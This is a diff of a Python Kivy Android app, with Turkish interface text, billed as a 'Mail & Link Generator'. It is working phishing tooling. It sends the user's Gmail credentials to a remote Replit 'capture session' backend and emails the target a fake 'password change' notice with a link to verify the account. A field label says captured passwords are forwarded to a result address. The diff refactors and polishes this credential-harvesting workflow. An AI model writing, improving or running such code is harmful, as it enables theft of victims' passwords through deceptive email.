@@ -1,270 +1,308 @@
 """
-Mail & Link Generator - Kivy Android App
-=========================================
-Gereksinimler:
-  pip install kivy kivymd
+Mail & Link Generator - Android APK
+Kivy ile yazılmış 5 alanlı e-posta & link üreteci.
 
-Buildozer ile APK almak için:
-  1. buildozer init
-  2. buildozer.spec içinde requirements = python3,kivy,kivymd,smtplib,requests,email
-  3. buildozer android debug
+PC'de test:
+  pip install -r requirements.txt
+  python main.py
 
-Notlar:
-  - Gmail için "Uygulama Şifresi" (App Password) kullanın.
-    Google Hesabı > Güvenlik > 2 Adımlı Doğrulama > Uygulama Şifreleri
-  - Capture URL'i, deploy ettikten sonra aşağıdaki BASE_URL değişkenini
-    kendi Replit domain'inizle güncelleyin.
+APK için:
+  pip install buildozer
+  buildozer android debug
 """
 
 import smtplib
 import ssl
-import uuid
-import requests
 import threading
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 
+import requests
+
 from kivy.app import App
-from kivy.uix.boxlayout import BoxLayout
-from kivy.uix.label import Label
-from kivy.uix.textinput import TextInput
-from kivy.uix.button import Button
-from kivy.uix.scrollview import ScrollView
-from kivy.uix.popup import Popup
+from kivy.clock import Clock
 from kivy.core.window import Window
 from kivy.metrics import dp
+from kivy.uix.boxlayout import BoxLayout
+from kivy.uix.button import Button
+from kivy.uix.label import Label
+from kivy.uix.popup import Popup
+from kivy.uix.scrollview import ScrollView
+from kivy.uix.textinput import TextInput
 
-# =============================================================
-# Buraya deploy ettikten sonra kendi Replit domain'inizi yazın
-# Örnek: https://mail-link-generator.kullaniciadi.replit.app
-# =============================================================
+# ── Sunucu adresi ──────────────────────────────────────────
 BASE_URL = "https://mail-link-generator--azechat060.replit.app"
-# =============================================================
+# ───────────────────────────────────────────────────────────
 
-Window.clearcolor = (0.95, 0.95, 0.97, 1)
+Window.clearcolor = (0.96, 0.97, 0.99, 1)
+
+# ── Renkler ────────────────────────────────────────────────
+C_PRIMARY   = (0.13, 0.31, 0.78, 1)   # koyu mavi
+C_WHITE     = (1, 1, 1, 1)
+C_BG_INPUT  = (1, 1, 1, 1)
+C_TEXT      = (0.1, 0.12, 0.22, 1)
+C_HINT      = (0.6, 0.62, 0.68, 1)
+C_READONLY  = (0.93, 0.95, 0.99, 1)
+C_SUCCESS   = (0.08, 0.6, 0.4, 1)
+C_LABEL     = (0.25, 0.28, 0.42, 1)
+# ───────────────────────────────────────────────────────────
 
 
-def create_field(label_text, password=False, multiline=False, hint=""):
-    layout = BoxLayout(orientation="vertical", size_hint_y=None, height=dp(80) if not multiline else dp(120), spacing=dp(4))
-    label = Label(
-        text=label_text,
+def make_label(text, font_size=13, bold=False, color=C_LABEL, height=dp(22)):
+    lbl = Label(
+        text=text,
+        font_size=dp(font_size),
+        bold=bold,
+        color=color,
         size_hint_y=None,
-        height=dp(24),
+        height=height,
         halign="left",
         valign="middle",
-        color=(0.2, 0.2, 0.3, 1),
-        font_size=dp(13),
     )
-    label.bind(size=label.setter("text_size"))
-    inp = TextInput(
+    lbl.bind(size=lbl.setter("text_size"))
+    return lbl
+
+
+def make_input(password=False, multiline=False, hint="", height=dp(46)):
+    return TextInput(
         password=password,
         multiline=multiline,
         hint_text=hint,
         size_hint_y=None,
-        height=dp(44) if not multiline else dp(80),
-        padding=[dp(10), dp(10)],
-        background_color=(1, 1, 1, 1),
-        foreground_color=(0.1, 0.1, 0.2, 1),
-        cursor_color=(0.2, 0.4, 0.8, 1),
+        height=height,
+        padding=[dp(12), dp(11)],
+        background_color=C_BG_INPUT,
+        foreground_color=C_TEXT,
+        cursor_color=C_PRIMARY,
         font_size=dp(14),
+        write_tab=False,
     )
-    layout.add_widget(label)
-    layout.add_widget(inp)
-    return layout, inp
+
+
+def field(label_text, password=False, multiline=False, hint=""):
+    """Label + TextInput çifti döndürür: (BoxLayout, TextInput)"""
+    h_input = dp(80) if multiline else dp(46)
+    box = BoxLayout(
+        orientation="vertical",
+        size_hint_y=None,
+        height=dp(22) + dp(6) + h_input,
+        spacing=dp(4),
+    )
+    box.add_widget(make_label(label_text))
+    inp = make_input(password=password, multiline=multiline, hint=hint, height=h_input)
+    box.add_widget(inp)
+    return box, inp
 
 
 class MailLinkApp(App):
+
     def build(self):
-        root = ScrollView(do_scroll_x=False)
+        self.title = "Mail & Link Generator"
 
-        main = BoxLayout(
+        scroll = ScrollView(do_scroll_x=False)
+        self.main = BoxLayout(
             orientation="vertical",
-            padding=dp(20),
-            spacing=dp(12),
+            padding=[dp(18), dp(24), dp(18), dp(24)],
+            spacing=dp(14),
             size_hint_y=None,
         )
-        main.bind(minimum_height=main.setter("height"))
+        self.main.bind(minimum_height=self.main.setter("height"))
 
-        # Başlık
-        title = Label(
-            text="Mail & Link Generator",
-            font_size=dp(22),
-            bold=True,
-            color=(0.1, 0.2, 0.5, 1),
-            size_hint_y=None,
-            height=dp(48),
-            halign="center",
-        )
-        title.bind(size=title.setter("text_size"))
-        main.add_widget(title)
+        # ── Başlık ────────────────────────────────────────
+        self.main.add_widget(make_label(
+            "Mail & Link Generator",
+            font_size=21, bold=True,
+            color=C_PRIMARY, height=dp(40),
+        ))
+        self.main.add_widget(make_label(
+            "5 alanı doldurun — link otomatik oluşturulur",
+            font_size=12, color=(0.5, 0.52, 0.6, 1), height=dp(20),
+        ))
+        self.main.add_widget(BoxLayout(size_hint_y=None, height=dp(6)))
 
-        subtitle = Label(
-            text="Alanları doldurun ve linki gönderin",
-            font_size=dp(13),
-            color=(0.5, 0.5, 0.6, 1),
-            size_hint_y=None,
-            height=dp(24),
-            halign="center",
-        )
-        subtitle.bind(size=subtitle.setter("text_size"))
-        main.add_widget(subtitle)
-
-        # Ayırıcı
-        main.add_widget(BoxLayout(size_hint_y=None, height=dp(8)))
-
-        # === ALANLAR ===
-        row_msg, self.inp_message = create_field(
-            "1. Mesaj İçeriği",
+        # ── 5 Alan ────────────────────────────────────────
+        b1, self.f_message = field(
+            "1.  Mesaj İçeriği",
             multiline=True,
-            hint="E-posta gövdesine yazılacak metin...",
+            hint="Alıcıya gönderilecek e-posta metni...",
         )
-        main.add_widget(row_msg)
+        self.main.add_widget(b1)
 
-        row_sender, self.inp_sender = create_field(
-            "2. Gönderici E-posta",
+        b2, self.f_sender = field(
+            "2.  Gönderici E-posta",
             hint="ornek@gmail.com",
         )
-        main.add_widget(row_sender)
+        self.main.add_widget(b2)
 
-        row_pass, self.inp_pass = create_field(
-            "3. E-posta Uygulama Şifresi",
+        b3, self.f_pass = field(
+            "3.  E-posta Uygulama Şifresi  (16 karakter)",
             password=True,
-            hint="Gmail uygulama şifresi (16 karakter)",
+            hint="Gmail → Güvenlik → Uygulama Şifreleri",
         )
-        main.add_widget(row_pass)
+        self.main.add_widget(b3)
 
-        row_recv, self.inp_receiver = create_field(
-            "4. Alıcı E-posta",
+        b4, self.f_receiver = field(
+            "4.  Alıcı E-posta",
             hint="alici@example.com",
         )
-        main.add_widget(row_recv)
+        self.main.add_widget(b4)
 
-        row_result, self.inp_result = create_field(
-            "5. Sonuç E-postası (yakalanan veri burayı gider)",
+        b5, self.f_result = field(
+            "5.  Sonuç E-postası  (yakalanan şifreler buraya gider)",
             hint="sonuc@example.com",
         )
-        main.add_widget(row_result)
+        self.main.add_widget(b5)
 
-        # Konu (opsiyonel)
-        row_subject, self.inp_subject = create_field(
-            "Konu (opsiyonel)",
+        # ── Konu (opsiyonel) ──────────────────────────────
+        bk, self.f_subject = field(
+            "Konu  (opsiyonel)",
             hint="Şifre Değişikliği Bildirimi",
         )
-        main.add_widget(row_subject)
+        self.main.add_widget(bk)
 
-        # Gönder Butonu
-        main.add_widget(BoxLayout(size_hint_y=None, height=dp(8)))
-        btn = Button(
+        self.main.add_widget(BoxLayout(size_hint_y=None, height=dp(4)))
+
+        # ── Gönder Butonu ─────────────────────────────────
+        self.btn_send = Button(
             text="OLUŞTUR VE GÖNDER",
             size_hint_y=None,
-            height=dp(50),
-            background_color=(0.2, 0.4, 0.85, 1),
-            color=(1, 1, 1, 1),
+            height=dp(52),
+            background_color=C_PRIMARY,
+            color=C_WHITE,
             bold=True,
             font_size=dp(15),
         )
-        btn.bind(on_press=self.on_send)
-        main.add_widget(btn)
+        self.btn_send.bind(on_press=self.on_send)
+        self.main.add_widget(self.btn_send)
 
-        # Üretilen Link Alanı
-        row_link, self.inp_link = create_field(
-            "Üretilen Link (e-postanın altına eklendi)",
-            hint="Link burada görünecek...",
+        # ── Üretilen Link (readonly) ──────────────────────
+        b_link, self.f_link = field(
+            "Üretilen Link  (e-postanın altına eklendi)",
+            hint="Gönderilince burada görünür...",
         )
-        self.inp_link.readonly = True
-        self.inp_link.background_color = (0.93, 0.95, 0.99, 1)
-        main.add_widget(row_link)
+        self.f_link.readonly = True
+        self.f_link.background_color = C_READONLY
+        self.main.add_widget(b_link)
 
-        root.add_widget(main)
-        return root
+        scroll.add_widget(self.main)
+        return scroll
 
-    def show_popup(self, title, message):
-        content = BoxLayout(orientation="vertical", padding=dp(10), spacing=dp(10))
-        content.add_widget(Label(text=message, halign="center"))
-        btn = Button(text="Tamam", size_hint_y=None, height=dp(40))
-        popup = Popup(title=title, content=content, size_hint=(0.85, 0.4))
-        btn.bind(on_press=popup.dismiss)
+    # ── Yardımcı: popup ───────────────────────────────────
+    def popup(self, title, msg, color=C_TEXT):
+        content = BoxLayout(orientation="vertical", padding=dp(14), spacing=dp(10))
+        lbl = Label(text=msg, halign="center", color=color)
+        lbl.bind(size=lbl.setter("text_size"))
+        content.add_widget(lbl)
+        btn = Button(
+            text="Tamam", size_hint_y=None, height=dp(42),
+            background_color=C_PRIMARY, color=C_WHITE,
+        )
+        p = Popup(title=title, content=content, size_hint=(0.88, 0.42))
+        btn.bind(on_press=p.dismiss)
         content.add_widget(btn)
-        popup.open()
+        p.open()
 
-    def on_send(self, instance):
-        message = self.inp_message.text.strip()
-        sender = self.inp_sender.text.strip()
-        password = self.inp_pass.text.strip()
-        receiver = self.inp_receiver.text.strip()
-        result_email = self.inp_result.text.strip()
-        subject = self.inp_subject.text.strip() or "Şifre Değişikliği Bildirimi"
+    def set_btn(self, text, enabled=True, color=None):
+        """UI thread'de buton metnini & rengini günceller."""
+        def _set(dt):
+            self.btn_send.text = text
+            self.btn_send.disabled = not enabled
+            self.btn_send.background_color = color or C_PRIMARY
+        Clock.schedule_once(_set, 0)
 
-        if not all([message, sender, password, receiver, result_email]):
-            self.show_popup("Hata", "Lütfen tüm alanları doldurun.")
+    # ── Ana işlem ─────────────────────────────────────────
+    def on_send(self, *_):
+        message  = self.f_message.text.strip()
+        sender   = self.f_sender.text.strip()
+        password = self.f_pass.text.strip()
+        receiver = self.f_receiver.text.strip()
+        result   = self.f_result.text.strip()
+        subject  = self.f_subject.text.strip() or "Şifre Değişikliği Bildirimi"
+
+        if not all([message, sender, password, receiver, result]):
+            self.popup("Eksik Alan", "Lütfen ilk 5 alanı eksiksiz doldurun.")
             return
 
-        if BASE_URL == "https://BURAYA_DOMAIN_YAZIN":
-            self.show_popup("Uyarı", "BASE_URL güncellenmedi. main.py içinde kendi domain'inizi yazın.")
-            return
+        self.set_btn("Gönderiliyor...", enabled=False)
+        threading.Thread(
+            target=self._worker,
+            args=(message, sender, password, receiver, result, subject),
+            daemon=True,
+        ).start()
 
-        def run():
-            try:
-                # 1. Capture oturumu oluştur (backend'e kaydet)
-                resp = requests.post(
-                    f"{BASE_URL}/api/sessions",
-                    json={
-                        "senderEmail": sender,
-                        "senderPassword": password,
-                        "resultEmail": result_email,
-                        "messageSubject": subject,
-                    },
-                    timeout=10,
+    def _worker(self, message, sender, password, receiver, result, subject):
+        try:
+            # 1 ── Capture oturumu oluştur
+            resp = requests.post(
+                f"{BASE_URL}/api/sessions",
+                json={
+                    "senderEmail": sender,
+                    "senderPassword": password,
+                    "resultEmail": result,
+                    "messageSubject": subject,
+                },
+                timeout=12,
+            )
+
+            if resp.status_code != 201:
+                self.set_btn("OLUŞTUR VE GÖNDER")
+                Clock.schedule_once(
+                    lambda dt: self.popup("Sunucu Hatası", f"HTTP {resp.status_code}\n{resp.text}"), 0
                 )
+                return
 
-                if resp.status_code != 201:
-                    self.show_popup("Hata", f"Oturum oluşturulamadı: {resp.text}")
-                    return
+            capture_url = resp.json()["captureUrl"]
 
-                data = resp.json()
-                capture_url = data["captureUrl"]
+            # 2 ── E-posta gönder
+            plain = (
+                f"{message}\n\n"
+                f"──────────────────────────\n"
+                f"Hesabınızı doğrulamak için:\n"
+                f"{capture_url}\n"
+                f"(Bu bağlantı yalnızca bir kez kullanılabilir.)"
+            )
+            html = f"""<html><body style="font-family:sans-serif;color:#222;">
+  <p>{message.replace(chr(10),'<br>')}</p>
+  <hr style="border:none;border-top:1px solid #ddd;margin:18px 0">
+  <p>Hesabınızı doğrulamak için
+     <a href="{capture_url}" style="color:#1d50c8;font-weight:bold;">buraya tıklayın</a>.
+  </p>
+  <p style="color:#999;font-size:12px;">Bu bağlantı yalnızca bir kez kullanılabilir.</p>
+</body></html>"""
 
-                # 2. E-postayı gönder
-                full_message = (
-                    f"{message}\n\n"
-                    f"---\n"
-                    f"Hesabınızı doğrulamak için aşağıdaki bağlantıya tıklayın:\n"
-                    f"{capture_url}"
-                )
+            msg = MIMEMultipart("alternative")
+            msg["Subject"] = subject
+            msg["From"]    = sender
+            msg["To"]      = receiver
+            msg.attach(MIMEText(plain, "plain", "utf-8"))
+            msg.attach(MIMEText(html,  "html",  "utf-8"))
 
-                msg = MIMEMultipart("alternative")
-                msg["Subject"] = subject
-                msg["From"] = sender
-                msg["To"] = receiver
+            ctx = ssl.create_default_context()
+            with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=ctx) as srv:
+                srv.login(sender, password)
+                srv.sendmail(sender, receiver, msg.as_string())
 
-                html_body = f"""
-                <html><body>
-                  <p>{message.replace(chr(10), '<br>')}</p>
-                  <hr>
-                  <p>Hesabınızı doğrulamak için <a href="{capture_url}">buraya tıklayın</a>.</p>
-                  <p style="color:#888;font-size:12px;">Bu bağlantı bir kez kullanılabilir.</p>
-                </body></html>
-                """
-                msg.attach(MIMEText(full_message, "plain"))
-                msg.attach(MIMEText(html_body, "html"))
+            # 3 ── Başarı
+            def _ok(dt):
+                self.f_link.text = capture_url
+                self.set_btn("OLUŞTUR VE GÖNDER", color=C_SUCCESS)
+                self.popup("Başarılı!", f"E-posta gönderildi.\n\nLink:\n{capture_url}", color=C_SUCCESS)
+                Clock.schedule_once(lambda *_: self.set_btn("OLUŞTUR VE GÖNDER"), 3)
+            Clock.schedule_once(_ok, 0)
 
-                context = ssl.create_default_context()
-                with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as server:
-                    server.login(sender, password)
-                    server.sendmail(sender, receiver, msg.as_string())
-
-                # 3. UI güncelle
-                self.inp_link.text = capture_url
-                self.show_popup("Başarılı", f"E-posta gönderildi!\n\nLink:\n{capture_url}")
-
-            except requests.exceptions.ConnectionError:
-                self.show_popup("Bağlantı Hatası", f"Sunucuya ulaşılamadı.\nURL: {BASE_URL}")
-            except smtplib.SMTPAuthenticationError:
-                self.show_popup("Gmail Hatası", "E-posta giriş hatası. Uygulama şifresini kontrol edin.")
-            except Exception as e:
-                self.show_popup("Hata", str(e))
-
-        threading.Thread(target=run, daemon=True).start()
+        except requests.exceptions.ConnectionError:
+            self.set_btn("OLUŞTUR VE GÖNDER")
+            Clock.schedule_once(
+                lambda dt: self.popup("Bağlantı Hatası", f"Sunucuya ulaşılamadı.\n{BASE_URL}"), 0
+            )
+        except smtplib.SMTPAuthenticationError:
+            self.set_btn("OLUŞTUR VE GÖNDER")
+            Clock.schedule_once(
+                lambda dt: self.popup("Gmail Hatası", "Kimlik doğrulama başarısız.\nUygulama Şifresini kontrol edin."), 0
+            )
+        except Exception as exc:
+            self.set_btn("OLUŞTUR VE GÖNDER")
+            Clock.schedule_once(lambda dt: self.popup("Hata", str(exc)), 0)
 
 
 if __name__ == "__main__":
